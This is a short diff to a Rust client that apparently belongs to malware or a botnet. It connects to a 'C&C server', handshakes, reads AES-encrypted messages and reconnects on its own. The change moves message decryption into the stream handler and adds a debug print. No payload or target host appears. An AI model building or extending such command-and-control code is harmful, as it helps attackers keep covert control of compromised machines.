@@ -27,7 +27,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         println!("Connected to C&C server successfully");
 
-        let mut stream = socket::SocketStream::new(connection.unwrap());
+        let mut stream = socket::SocketStream::new(connection.unwrap(), &k, &n);
         // TODO : Use the RSA :facepalm:
         // send handshake
         println!("Sending handshake");
@@ -42,6 +42,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             if let Err(ref e) = msg {
                 if e.kind() == std::io::ErrorKind::WouldBlock {
                     continue;
+                } else {
+                    println!("Another error pplllease");
                 }
                 // break
             } // this error probably indicates about block of the read abilities.
@@ -51,11 +53,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             if n_bytes == 0 {
                 break; // try to reconnect
             }
-
-            let trimmed = msg.split(|s| s == &(0 as u8)).next().unwrap();
-
-            let decrypted_msg = crypto::decrypt_from_aes(trimmed.to_vec(), &k, &n);
-            stream.handle_msg(decrypted_msg).await;
+            stream.handle_msg(msg, n_bytes).await;
         }
 
         eprintln!("Disconnected, trying to reconnect in 5 seconds...");
